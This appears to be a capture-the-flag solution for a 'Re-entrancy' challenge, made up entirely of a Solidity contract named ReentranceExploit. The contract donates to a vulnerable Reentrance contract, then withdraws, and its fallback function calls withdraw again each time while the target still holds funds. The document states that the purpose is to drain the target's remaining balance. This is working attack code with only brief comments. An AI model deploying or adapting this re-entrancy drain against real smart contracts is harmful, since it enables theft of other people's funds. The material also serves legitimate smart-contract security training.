# 10 - Re-entrancy

### Scripted Solution

```solidity
// SPDX-License-Identifier: MIT

pragma solidity 0.8.7;

interface IReentrance {
    function donate(address _to) external payable;

    function withdraw(uint _amount) external;

    function balanceOf(address _who) external view returns (uint balance);
}

contract ReentranceExploit {
    IReentrance private _reentranceContract;
    uint256 private _amountToWithdraw = 0;

    /**
     * Constructor sets `Reentrance` contract and its total balance in wei.
     */
    constructor(address reentranceContractAddress) payable {
        require(
            msg.value > 0,
            "ReentranceExploit: Contract must be deployed with ether for gas fees"
        );

        _reentranceContract = IReentrance(reentranceContractAddress);
    }

    /**
     * Calls `Reentrance` contract's `donate` to add provided `amount` to this
     * contract's balance.
     */
    function donate() external payable {
        require(
            msg.value > 0,
            "ReentranceExploit: Function must be called with non-zero value"
        );

        _reentranceContract.donate{value: msg.value}(address(this));
    }

    /**
     * Calls `Reentrance` contract's `withdraw` with provided `amount`.
     *
     * Note: this should be called with the exact amount donated to this
     * contract address to initiate the re-entrancy exploit.
     */
    function withdraw(uint256 amount) external {
        _amountToWithdraw = amount;
        _reentranceContract.withdraw(amount);
    }

    /**
     * Fallback handles re-entrancy attack.
     *
     * This receive function will call `withdraw` repeatedly to drain the total
     * amount of the remaining funds in the `Reentrance` contract.
     */
    fallback() external payable {
        if (address(_reentranceContract).balance >= _amountToWithdraw) {
            _reentranceContract.withdraw(_amountToWithdraw);
        }
    }
}
```
